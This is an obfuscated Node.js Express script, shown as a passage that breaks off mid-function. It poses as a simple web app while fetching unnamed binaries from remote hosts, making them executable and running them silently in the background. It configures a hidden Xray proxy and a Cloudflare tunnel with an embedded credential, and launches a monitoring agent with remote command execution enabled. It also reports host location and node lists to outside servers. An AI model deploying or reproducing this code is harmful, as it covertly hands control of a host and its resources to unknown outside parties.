const _0x283779=_0x2bcb;(function(_0x5796e6,_0x37f466){const _0x2ce72e={_0x4f7a0:0x16d,_0x336d6d:0x1bd,_0x5aeb9f:0x17e,_0x5d8eff:0x182,_0x21ffa1:0x134},_0x5123d5=_0x2bcb,_0x29045f=_0x5796e6();while(!![]){try{const _0x333bd3=parseInt(_0x5123d5(_0x2ce72e._0x4f7a0))/0x1+parseInt(_0x5123d5(0x1b5))/0x2+-parseInt(_0x5123d5(_0x2ce72e._0x336d6d))/0x3+-parseInt(_0x5123d5(_0x2ce72e._0x5aeb9f))/0x4*(-parseInt(_0x5123d5(0x181))/0x5)+-parseInt(_0x5123d5(_0x2ce72e._0x5d8eff))/0x6*(parseInt(_0x5123d5(0x1d1))/0x7)+-parseInt(_0x5123d5(0x14b))/0x8+parseInt(_0x5123d5(_0x2ce72e._0x21ffa1))/0x9;if(_0x333bd3===_0x37f466)break;else _0x29045f['push'](_0x29045f['shift']());}catch(_0x5221b7){_0x29045f['push'](_0x29045f['shift']());}}}(_0x2311,0x5bb3e));const express=require(_0x283779(0x159)),app=express(),axios=require(_0x283779(0x143)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x283779(0x185)),exec=promisify(require(_0x283779(0x184))['exec']),UPLOAD_URL=process[_0x283779(0x163)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x283779(0x163)][_0x283779(0x170)]||'',AUTO_ACCESS=process['env'][_0x283779(0x167)]||![],FILE_PATH=process[_0x283779(0x163)]['FILE_PATH']||_0x283779(0x183),SUB_PATH=process['env'][_0x283779(0x1a4)]||'sub',PORT=process[_0x283779(0x163)][_0x283779(0x1b1)]||process[_0x283779(0x163)][_0x283779(0x15b)]||0xbb8,UUID=process['env'][_0x283779(0x151)]||'ebc2ae3c-3258-78c6-5b7f-a89b7fcb91e8',NEZHA_SERVER=process[_0x283779(0x163)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x283779(0x163)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x283779(0x171)]||'',ARGO_DOMAIN=process[_0x283779(0x163)][_0x283779(0x1ba)]||'galaxy.hndz.qzz.io',ARGO_AUTH=process[_0x283779(0x163)][_0x283779(0x1dd)]||_0x283779(0x177),ARGO_PORT=process[_0x283779(0x163)][_0x283779(0x1b9)]||0x1f41,CFIP=process[_0x283779(0x163)][_0x283779(0x169)]||'cdns.doon.eu.org',CFPORT=process[_0x283779(0x163)]['CFPORT']||0x1bb,NAME=process['env']['NAME']||'Galaxy';!fs[_0x283779(0x1ca)](FILE_PATH)?(fs[_0x283779(0x195)](FILE_PATH),console['log'](FILE_PATH+_0x283779(0x1a3))):console['log'](FILE_PATH+_0x283779(0x1d4));function generateRandomName(){const _0x951ab2={_0x4ede5c:0x1cc,_0x5191cf:0x136,_0x45b5c4:0x1e1,_0x25c66d:0x13d},_0x1b44e6=_0x283779,_0x21943f=_0x1b44e6(_0x951ab2._0x4ede5c);let _0xb1de7e='';for(let _0x249c04=0x0;_0x249c04<0x6;_0x249c04++){_0xb1de7e+=_0x21943f[_0x1b44e6(_0x951ab2._0x5191cf)](Math[_0x1b44e6(0x12d)](Math[_0x1b44e6(_0x951ab2._0x45b5c4)]()*_0x21943f[_0x1b44e6(_0x951ab2._0x25c66d)]));}return _0xb1de7e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x283779(0x1d0)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x283779(0x1d0)](FILE_PATH,webName),botPath=path[_0x283779(0x1d0)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x283779(0x1d0)](FILE_PATH,_0x283779(0x152)),bootLogPath=path[_0x283779(0x1d0)](FILE_PATH,_0x283779(0x1cb)),configPath=path['join'](FILE_PATH,_0x283779(0x126));function deleteNodes(){const _0x3ec561={_0x2cb446:0x1b4,_0x172140:0x19e,_0x413233:0x13f,_0x33ce07:0x11f,_0x5642ed:0x1df,_0x15e6fe:0x1d5},_0xce96ee=_0x283779;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x124a26;try{_0x124a26=fs[_0xce96ee(_0x3ec561._0x2cb446)](subPath,_0xce96ee(0x11f));}catch{return null;}const _0x15af0e=Buffer[_0xce96ee(0x1db)](_0x124a26,_0xce96ee(_0x3ec561._0x172140))[_0xce96ee(_0x3ec561._0x413233)](_0xce96ee(_0x3ec561._0x33ce07)),_0x4ebeb8=_0x15af0e['split']('\x0a')[_0xce96ee(_0x3ec561._0x5642ed)](_0x4a5c3e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xce96ee(0x18d)](_0x4a5c3e));if(_0x4ebeb8[_0xce96ee(0x13d)]===0x0)return;return axios[_0xce96ee(_0x3ec561._0x15e6fe)](UPLOAD_URL+'/api/delete-nodes',JSON[_0xce96ee(0x14f)]({'nodes':_0x4ebeb8}),{'headers':{'Content-Type':'application/json'}})[_0xce96ee(0x14c)](_0x475ae5=>{return null;}),null;}catch(_0x353a54){return null;}}function cleanupOldFiles(){const _0x11ae56={_0x49827f:0x121},_0x5e199d={_0x23ca03:0x15e,_0x78c4df:0x1c0},_0x3a416b=_0x283779;try{const _0x40a60e=fs[_0x3a416b(_0x11ae56._0x49827f)](FILE_PATH);_0x40a60e['forEach'](_0x49f0b1=>{const _0xf48fa3=_0x3a416b,_0x3b90f3=path[_0xf48fa3(0x1d0)](FILE_PATH,_0x49f0b1);try{const _0x2a78b1=fs['statSync'](_0x3b90f3);_0x2a78b1[_0xf48fa3(_0x5e199d._0x23ca03)]()&&fs[_0xf48fa3(_0x5e199d._0x78c4df)](_0x3b90f3);}catch(_0x3a7f00){}});}catch(_0xd4d6ab){}}function _0x2bcb(_0xc6ecbb,_0x4fceb7){const _0x231107=_0x2311();return _0x2bcb=function(_0x2bcb7f,_0x5ee0c0){_0x2bcb7f=_0x2bcb7f-0x11f;let _0x393dc8=_0x231107[_0x2bcb7f];return _0x393dc8;},_0x2bcb(_0xc6ecbb,_0x4fceb7);}function _0x2311(){const _0x18f7fc=['&path=%2Fvless-argo%3Fed%3D2560#','writeFileSync','722485KYCMbS','27672KZVcQs','.tmp','child_process','util','/vmess-argo','platform','forEach','match','\x0avless://','\x20>\x20nul\x202>&1','createWriteStream','test','pkill\x20-f\x20\x22[','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','arm','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','2053','/tunnel.yml\x20run','Error\x20executing\x20command:\x20','mkdirSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/vless-argo','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','split','\x20-c\x20','clear','\x20is\x20running','&fp=firefox&type=ws&host=','base64','npm\x20running\x20error:\x20','tunnel.json','443','https://oooo.serv00.net/add-url','\x20is\x20created','SUB_PATH','vmess','\x20successfully','del\x20/f\x20/q\x20','Content-Type','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','chmod','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/sub.txt\x20saved\x20successfully','https://amd64.ssss.nyc.mn/v1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','message','web\x20running\x20error:\x20','SERVER_PORT','http','\x0a\x0avmess://','readFileSync','811520ZOHixf','unshift','http://ip-api.com/json','\x20failed:\x20','ARGO_PORT','ARGO_DOMAIN','text/plain;\x20charset=utf-8','tunnel.yml','1366200eErjQg','https://arm64.ssss.nyc.mn/v1','/trojan-argo','unlinkSync','nohup\x20','\x0aclient_secret:\x20','pop','\x22\x20>\x20/dev/null\x202>&1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20-p\x20','Download\x20','\x20>/dev/null\x202>&1\x20&','includes','existsSync','boot.log','abcdefghijklmnopqrstuvwxyz','Empowerment\x20failed\x20for\x20','?security=tls&sni=','pipe','join','217EEEzcD','Unhandled\x20error\x20in\x20startserver:','\x20>/dev/null\x202>&1','\x20already\x20exists','post','xtls-rprx-vision','https://amd64.ssss.nyc.mn/web','application/json','https://arm64.ssss.nyc.mn/agent','2096','from','https://ipapi.co/json','ARGO_AUTH','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','filter','/api/add-subscriptions','random','utf-8','\x20-c\x20\x22','readdirSync','basename','fileUrl','TunnelSecret','2087','config.json','unlink','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Skipping\x20adding\x20automatic\x20access\x20task','ArgoDomain:','.exe\x20>\x20nul\x202>&1','data','floor','true','send','&path=%2Ftrojan-argo%3Fed%3D2560#','arm64','\x0a\x20\x20\x20\x20','trojan','1697256KtMEjD','false','charAt','https://amd64.ssss.nyc.mn/agent','Error\x20downloading\x20files:','blackhole','/api/add-nodes','arch','tcp','length','error','toString','org','quic','stream','axios','127.0.0.1','\x0a\x20\x20tunnel:\x20','index.html','country_code','http\x20server\x20is\x20running\x20on\x20port:','Nodes\x20uploaded\x20successfully','/config.json\x20>/dev/null\x202>&1\x20&','3216288nNChkd','catch','utf8','Add\x20automatic\x20access\x20task\x20faild:\x20','stringify','fileName','UUID','list.txt','2083','vless','https://amd64.ssss.nyc.mn/bot','Error\x20in\x20startserver:','log','status','express','close','PORT','push','Empowerment\x20success\x20for\x20','isFile','Unknown','tls','Error\x20reading\x20boot.log:','has','env','https://arm64.ssss.nyc.mn/web','App\x20is\x20running','amd','AUTO_ACCESS','https://arm64.ssss.nyc.mn/bot','CFIP','countryCode','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','492684nIFild','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','automatic\x20access\x20task\x20added\x20successfully','PROJECT_URL','NEZHA_KEY','win32','\x0a\x0atrojan://','response','8443','map','eyJhIjoiZDhhNzU0M2EwZDIyY2YwZTcxODQxODU3MzNlY2NmMmYiLCJ0IjoiYmNhZDc2M2UtYzhhOC00YTI1LWJiYmItYjYxZDFmZmMwNmY2IiwicyI6IlpqVXdORGRqTVRJdE1XWmpNQzAwWlRGaExUaG1OVEl0TVRBek1XRmlPRFEyT0dFMSJ9','get','direct','ARGO_DOMAIN:','none','config.yaml','/dev/null','8VHDRYg'];_0x2311=function(){return _0x18f7fc;};return _0x2311();}async function generateConfig(){const _0x459ee0={_0x3a5e63:0x1d6,_0x3a6ca3:0x1bf,_0x1c8a8d:0x144,_0x551f9a:0x17b,_0x563ae4:0x197,_0x2b0a4a:0x1b2,_0xf46733:0x141,_0x414169:0x141,_0x176fcb:0x133,_0xc91d93:0x17b,_0x4536c9:0x1b2,_0x218117:0x139,_0x2a0a3f:0x126,_0x2703dd:0x14f},_0x24a386=_0x283779,_0x3a5df0={'log':{'access':_0x24a386(0x17d),'error':_0x24a386(0x17d),'loglevel':_0x24a386(0x17b)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x24a386(0x154),'settings':{'clients':[{'id':UUID,'flow':_0x24a386(_0x459ee0._0x3a5e63)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x24a386(0x197),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x24a386(_0x459ee0._0x3a6ca3),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x24a386(_0x459ee0._0x1c8a8d),'protocol':_0x24a386(0x154),'settings':{'clients':[{'id':UUID}],'decryption':_0x24a386(0x17b)},'streamSettings':{'network':_0x24a386(0x13c),'security':_0x24a386(0x17b)}},{'port':0xbba,'listen':_0x24a386(0x144),'protocol':_0x24a386(0x154),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x24a386(_0x459ee0._0x551f9a)},'streamSettings':{'network':'ws','security':_0x24a386(0x17b),'wsSettings':{'path':_0x24a386(_0x459ee0._0x563ae4)}},'sniffing':{'enabled':!![],'destOverride':[_0x24a386(_0x459ee0._0x2b0a4a),'tls',_0x24a386(_0x459ee0._0xf46733)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x24a386(0x144),'protocol':_0x24a386(0x1a5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x24a386(0x186)}},'sniffing':{'enabled':!![],'destOverride':[_0x24a386(0x1b2),_0x24a386(0x160),_0x24a386(_0x459ee0._0x414169)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x24a386(0x144),'protocol':_0x24a386(_0x459ee0._0x176fcb),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x24a386(_0x459ee0._0xc91d93),'wsSettings':{'path':_0x24a386(0x1bf)}},'sniffing':{'enabled':!![],'destOverride':[_0x24a386(_0x459ee0._0x4536c9),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x24a386(0x179)},{'protocol':_0x24a386(_0x459ee0._0x218117),'tag':'block'}]};fs[_0x24a386(0x180)](path[_0x24a386(0x1d0)](FILE_PATH,_0x24a386(_0x459ee0._0x2a0a3f)),JSON[_0x24a386(_0x459ee0._0x2703dd)](_0x3a5df0,null,0x2));}function getSystemArchitecture(){const _0x52dc6e={_0x4bb867:0x13b,_0xc30aa8:0x190,_0x57a93e:0x190,_0x12caf9:0x166},_0xd0bf67=_0x283779,_0x5a1234=os[_0xd0bf67(_0x52dc6e._0x4bb867)]();return _0x5a1234===_0xd0bf67(_0x52dc6e._0xc30aa8)||_0x5a1234===_0xd0bf67(0x131)||_0x5a1234==='aarch64'?_0xd0bf67(_0x52dc6e._0x57a93e):_0xd0bf67(_0x52dc6e._0x12caf9);}function downloadFile(_0x14d1ee,_0x5a70ee,_0x47aef0){const _0x4c125a={_0x5a64b5:0x1ca,_0x3a3d91:0x195,_0x3873f6:0x142,_0x61fd2:0x14c},_0x5bb0aa={_0x13e606:0x122,_0x47a3c5:0x1b8,_0x5a6238:0x1af,_0x212038:0x13e},_0x1901f0={_0x3fb5d3:0x1a6},_0x4f7399=_0x283779,_0x266401=_0x14d1ee;!fs[_0x4f7399(_0x4c125a._0x5a64b5)](FILE_PATH)&&fs[_0x4f7399(_0x4c125a._0x3a3d91)](FILE_PATH,{'recursive':!![]});const _0x4210d7=fs[_0x4f7399(0x18c)](_0x266401);axios({'method':'get','url':_0x5a70ee,'responseType':_0x4f7399(_0x4c125a._0x3873f6)})['then'](_0x4257c2=>{const _0x93470={_0x5d168e:0x1b8,_0x182c99:0x1af},_0x3733e4=_0x4f7399;_0x4257c2[_0x3733e4(0x12c)][_0x3733e4(0x1cf)](_0x4210d7),_0x4210d7['on']('finish',()=>{const _0xfa3457=_0x3733e4;_0x4210d7[_0xfa3457(0x15a)](),console[_0xfa3457(0x157)](_0xfa3457(0x1c7)+path[_0xfa3457(0x122)](_0x266401)+_0xfa3457(_0x1901f0._0x3fb5d3)),_0x47aef0(null,_0x266401);}),_0x4210d7['on']('error',_0x55fff0=>{const _0x314d56=_0x3733e4;fs[_0x314d56(0x127)](_0x266401,()=>{});const _0x5c4085='Download\x20'+path[_0x314d56(0x122)](_0x266401)+_0x314d56(_0x93470._0x5d168e)+_0x55fff0[_0x314d56(_0x93470._0x182c99)];console['error'](_0x5c4085),_0x47aef0(_0x5c4085);});})[_0x4f7399(_0x4c125a._0x61fd2)](_0xf2af76=>{const _0x5464a3=_0x4f7399,_0x34488e='Download\x20'+path[_0x5464a3(_0x5bb0aa._0x13e606)](_0x266401)+_0x5464a3(_0x5bb0aa._0x47a3c5)+_0xf2af76[_0x5464a3(_0x5bb0aa._0x5a6238)];console[_0x5464a3(_0x5bb0aa._0x212038)](_0x34488e),_0x47aef0(_0x34488e);});}async function downloadFilesAndRun(){const _0x1cf93f={_0x4c3dd1:0x157,_0x3cec2f:0x13e,_0x5aba9b:0x199,_0x2a4326:0x1c3,_0x3f529c:0x1a1,_0x4f9778:0x125,_0x450b65:0x153,_0x5dc920:0x162,_0x532f4e:0x12e,_0x4e709c:0x180,_0x37f0d7:0x1c1,_0x544800:0x1da,_0xca3fc5:0x192,_0x441199:0x1c1,_0x1f695d:0x19a,_0x458596:0x14a,_0x5b2d3a:0x157,_0x252fa4:0x1b0,_0x44e0ba:0x189,_0x215dc1:0x16e,_0x30f66d:0x196,_0x849ae5:0x1ae,_0x47f4ff:0x194},_0x21dc6c={_0x343b88:0x123},_0x1d2386=_0x283779,_0x487322=getSystemArchitecture(),_0x5a8732=getFilesForArchitecture(_0x487322);if(_0x5a8732['length']===0x0){console[_0x1d2386(_0x1cf93f._0x4c3dd1)](_0x1d2386(0x1c5));return;}const _0xe69e6b=_0x5a8732[_0x1d2386(0x176)](_0x4209cb=>{return new Promise((_0x1212dd,_0x460a51)=>{const _0x507821=_0x2bcb;downloadFile(_0x4209cb[_0x507821(0x150)],_0x4209cb[_0x507821(_0x21dc6c._0x343b88)],(_0x495173,_0x62b716)=>{_0x495173?_0x460a51(_0x495173):_0x1212dd(_0x62b716);});});});try{await Promise['all'](_0xe69e6b);}catch(_0x5ca9f2){console[_0x1d2386(_0x1cf93f._0x3cec2f)](_0x1d2386(0x138),_0x5ca9f2);return;}function _0x599f14(_0x584607){const _0x12c94d={_0x182f10:0x1aa},_0x549e7f=0x1fd;_0x584607['forEach'](_0x2e4a7a=>{const _0x1de2fe={_0x23cc33:0x157,_0x2e4704:0x15d,_0x55cf2e:0x13f},_0x28d033=_0x2bcb;fs[_0x28d033(0x1ca)](_0x2e4a7a)&&fs[_0x28d033(_0x12c94d._0x182f10)](_0x2e4a7a,_0x549e7f,_0x1acf2b=>{const _0x8e019e=_0x28d033;_0x1acf2b?console[_0x8e019e(0x13e)](_0x8e019e(0x1cd)+_0x2e4a7a+':\x20'+_0x1acf2b):console[_0x8e019e(_0x1de2fe._0x23cc33)](_0x8e019e(_0x1de2fe._0x2e4704)+_0x2e4a7a+':\x20'+_0x549e7f[_0x8e019e(_0x1de2fe._0x55cf2e)](0x8));});});}const _0x278dfb=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x599f14(_0x278dfb);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xa24945=NEZHA_SERVER[_0x1d2386(0x1c9)](':')?NEZHA_SERVER[_0x1d2386(_0x1cf93f._0x5aba9b)](':')[_0x1d2386(_0x1cf93f._0x2a4326)]():'',_0x3ee863=new Set([_0x1d2386(_0x1cf93f._0x3f529c),_0x1d2386(0x175),_0x1d2386(0x1da),_0x1d2386(_0x1cf93f._0x4f9778),_0x1d2386(_0x1cf93f._0x450b65),_0x1d2386(0x192)]),_0x3b4432=_0x3ee863[_0x1d2386(_0x1cf93f._0x5dc920)](_0xa24945)?_0x1d2386(_0x1cf93f._0x532f4e):_0x1d2386(0x135),_0xfc8a0f=_0x1d2386(0x1c2)+NEZHA_KEY+_0x1d2386(0x128)+NEZHA_SERVER+_0x1d2386(0x1a9)+_0x3b4432+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1d2386(_0x1cf93f._0x4e709c)](path[_0x1d2386(0x1d0)](FILE_PATH,_0x1d2386(0x17c)),_0xfc8a0f);const _0x46c15e=_0x1d2386(_0x1cf93f._0x37f0d7)+phpPath+_0x1d2386(0x120)+FILE_PATH+_0x1d2386(0x16b);try{await exec(_0x46c15e),console[_0x1d2386(0x157)](phpName+'\x20is\x20running'),await new Promise(_0xaf22c8=>setTimeout(_0xaf22c8,0x3e8));}catch(_0x1ae9dc){console[_0x1d2386(_0x1cf93f._0x3cec2f)]('php\x20running\x20error:\x20'+_0x1ae9dc);}}else{let _0x8e32b='';const _0x312e01=['443',_0x1d2386(0x175),_0x1d2386(_0x1cf93f._0x544800),_0x1d2386(0x125),'2083',_0x1d2386(_0x1cf93f._0xca3fc5)];_0x312e01[_0x1d2386(0x1c9)](NEZHA_PORT)&&(_0x8e32b='--tls');const _0x59311e='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x1d2386(0x1c6)+NEZHA_KEY+'\x20'+_0x8e32b+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x59311e),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x3911e0=>setTimeout(_0x3911e0,0x3e8));}catch(_0x29e874){console[_0x1d2386(_0x1cf93f._0x3cec2f)](_0x1d2386(0x19f)+_0x29e874);}}}else console[_0x1d2386(0x157)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x3db565=_0x1d2386(_0x1cf93f._0x441199)+webPath+_0x1d2386(_0x1cf93f._0x1f695d)+FILE_PATH+_0x1d2386(_0x1cf93f._0x458596);try{await exec(_0x3db565),console[_0x1d2386(_0x1cf93f._0x5b2d3a)](webName+'\x20is\x20running'),await new Promise(_0x7069d7=>setTimeout(_0x7069d7,0x3e8));}catch(_0x5af2d4){console[_0x1d2386(_0x1cf93f._0x3cec2f)](_0x1d2386(_0x1cf93f._0x252fa4)+_0x5af2d4);}if(fs[_0x1d2386(0x1ca)](botPath)){let _0x32cd5e;if(ARGO_AUTH[_0x1d2386(_0x1cf93f._0x44e0ba)](/^[A-Z0-9a-z=]{120,250}$/))_0x32cd5e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x1d2386(_0x1cf93f._0x44e0ba)](/TunnelSecret/)?_0x32cd5e=_0x1d2386(_0x1cf93f._0x215dc1)+FILE_PATH+_0x1d2386(0x193):_0x32cd5e=_0x1d2386(_0x1cf93f._0x30f66d)+FILE_PATH+_0x1d2386(_0x1cf93f._0x849ae5)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x32cd5e+_0x1d2386(0x1c8)),console[_0x1d2386(0x157)](botName+_0x1d2386(0x19c)),await new Promise(_0x38e6a3=>setTimeout(_0x38e6a3,0x7d0));}catch(_0x352205){console[_0x1d2386(0x13e)](_0x1d2386(_0x1cf93f._0x47f4ff)+_0x352205);}}await new Promise(_0x253ae6=>setTimeout(_0x253ae6,0x1388));}function getFilesForArchitecture(_0x1fd0f8){const _0x39738b={_0x1e76ea:0x1d7,_0x4902ab:0x1ad},_0x180587=_0x283779;let _0x1a03fe;_0x1fd0f8==='arm'?_0x1a03fe=[{'fileName':webPath,'fileUrl':_0x180587(0x164)},{'fileName':botPath,'fileUrl':_0x180587(0x168)}]:_0x1a03fe=[{'fileName':webPath,'fileUrl':_0x180587(_0x39738b._0x1e76ea)},{'fileName':botPath,'fileUrl':_0x180587(0x155)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x11344d=_0x1fd0f8===_0x180587(0x190)?_0x180587(0x1d9):_0x180587(0x137);_0x1a03fe['unshift']({'fileName':npmPath,'fileUrl':_0x11344d});}else{const _0x314878=_0x1fd0f8===_0x180587(0x190)?_0x180587(0x1be):_0x180587(_0x39738b._0x4902ab);_0x1a03fe[_0x180587(0x1b6)]({'fileName':phpPath,'fileUrl':_0x314878});}}return _0x1a03fe;}function argoType(){const _0x5557dc={_0x45ef47:0x199,_0x3d1314:0x1d0,_0x514a0f:0x198,_0x32606d:0x1bc,_0xd90e95:0x1ab},_0x1e4847=_0x283779;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x1e4847(0x1de));return;}if(ARGO_AUTH['includes'](_0x1e4847(0x124))){fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x48a829=_0x1e4847(0x145)+ARGO_AUTH[_0x1e4847(_0x5557dc._0x45ef47)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x1e4847(_0x5557dc._0x3d1314)](FILE_PATH,_0x1e4847(0x1a0))+_0x1e4847(0x16c)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x1e4847(_0x5557dc._0x514a0f);fs['writeFileSync'](path[_0x1e4847(_0x5557dc._0x3d1314)](FILE_PATH,_0x1e4847(_0x5557dc._0x32606d)),_0x48a829);}else console['log'](_0x1e4847(_0x5557dc._0xd90e95));}async function extractDomains(){const _0x1b43d7={_0x1fcce5:0x17a,_0x327d41:0x1d0,_0x5ccc16:0x188,_0x1aa363:0x13d,_0x3a6f59:0x157,_0x3329fc:0x1d0,_0x58a3a6:0x19c,_0x28be5f:0x13e},_0x2d2f11={_0x27de30:0x1dc,_0x2b3136:0x12c,_0x4f4d61:0x147,_0x5ac7c9:0x140,_0x4667b6:0x1b7,_0x3bc987:0x158,_0x1ef343:0x12c,_0x560703:0x16a,_0x17ddef:0x12c,_0x2bd8d4:0x12c,_0x5767e0:0x15f},_0x24e029={_0x1cad5b:0x12b,_0x4d15d8:0x136},_0x131dd5=_0x283779;let _0xe252ec;if(ARGO_AUTH&&ARGO_DOMAIN)_0xe252ec=ARGO_DOMAIN,console['log'](_0x131dd5(_0x1b43d7._0x1fcce5),_0xe252ec),await _0x53ca43(_0xe252ec);else try{const _0x42f143=fs[_0x131dd5(0x1b4)](path[_0x131dd5(_0x1b43d7._0x327d41)](FILE_PATH,_0x131dd5(0x1cb)),_0x131dd5(0x11f)),_0x4bf473=_0x42f143[_0x131dd5(0x199)]('\x0a'),_0x1731dd=[];_0x4bf473[_0x131dd5(_0x1b43d7._0x5ccc16)](_0x299ccc=>{const _0x3e9838=_0x131dd5,_0x1839ce=_0x299ccc[_0x3e9838(0x189)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1839ce){const _0x81ea53=_0x1839ce[0x1];_0x1731dd['push'](_0x81ea53);}});if(_0x1731dd[_0x131dd5(_0x1b43d7._0x1aa363)]>0x0)_0xe252ec=_0x1731dd[0x0],console[_0x131dd5(_0x1b43d7._0x3a6f59)](_0x131dd5(0x12a),_0xe252ec),await _0x53ca43(_0xe252ec);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x131dd5(_0x1b43d7._0x3329fc)](FILE_PATH,'boot.log'));async function _0x5ddb51(){const _0x3e449b=_0x131dd5;try{process[_0x3e449b(0x187)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x3e449b(_0x24e029._0x1cad5b)):await exec(_0x3e449b(0x18e)+botName[_0x3e449b(_0x24e029._0x4d15d8)](0x0)+']'+botName['substring'](0x1)+_0x3e449b(0x1c4));}catch(_0x477283){}}_0x5ddb51(),await new Promise(_0x4add0c=>setTimeout(_0x4add0c,0xbb8));const _0x55f0c6=_0x131dd5(0x196)+FILE_PATH+_0x131dd5(0x1ae)+ARGO_PORT;try{await exec(_0x131dd5(0x1c1)+botPath+'\x20'+_0x55f0c6+'\x20>/dev/null\x202>&1\x20&'),console[_0x131dd5(_0x1b43d7._0x3a6f59)](botName+_0x131dd5(_0x1b43d7._0x58a3a6)),await new Promise(_0x13a772=>setTimeout(_0x13a772,0xbb8)),await extractDomains();}catch(_0x1e6e38){console[_0x131dd5(_0x1b43d7._0x28be5f)]('Error\x20executing\x20command:\x20'+_0x1e6e38);}}}catch(_0x2fc961){console['error'](_0x131dd5(0x161),_0x2fc961);}async function _0x2a5c5e(){const _0x21e0dc=_0x131dd5;try{const _0x5e134d=await axios[_0x21e0dc(0x178)](_0x21e0dc(_0x2d2f11._0x27de30),{'timeout':0xbb8});if(_0x5e134d['data']&&_0x5e134d[_0x21e0dc(_0x2d2f11._0x2b3136)][_0x21e0dc(_0x2d2f11._0x4f4d61)]&&_0x5e134d['data'][_0x21e0dc(0x140)])return _0x5e134d[_0x21e0dc(_0x2d2f11._0x2b3136)][_0x21e0dc(0x147)]+'_'+_0x5e134d[_0x21e0dc(0x12c)][_0x21e0dc(_0x2d2f11._0x5ac7c9)];}catch(_0x3eac78){try{const _0x3a94cf=await axios['get'](_0x21e0dc(_0x2d2f11._0x4667b6),{'timeout':0xbb8});if(_0x3a94cf[_0x21e0dc(0x12c)]&&_0x3a94cf[_0x21e0dc(_0x2d2f11._0x2b3136)][_0x21e0dc(_0x2d2f11._0x3bc987)]==='success'&&_0x3a94cf[_0x21e0dc(_0x2d2f11._0x1ef343)][_0x21e0dc(_0x2d2f11._0x560703)]&&_0x3a94cf[_0x21e0dc(_0x2d2f11._0x17ddef)][_0x21e0dc(0x140)])return _0x3a94cf[_0x21e0dc(_0x2d2f11._0x2bd8d4)][_0x21e0dc(0x16a)]+'_'+_0x3a94cf[_0x21e0dc(_0x2d2f11._0x1ef343)][_0x21e0dc(0x140)];}catch(_0x47b744){}}return _0x21e0dc(_0x2d2f11._0x5767e0);}async function _0x53ca43(_0x33b6be){const 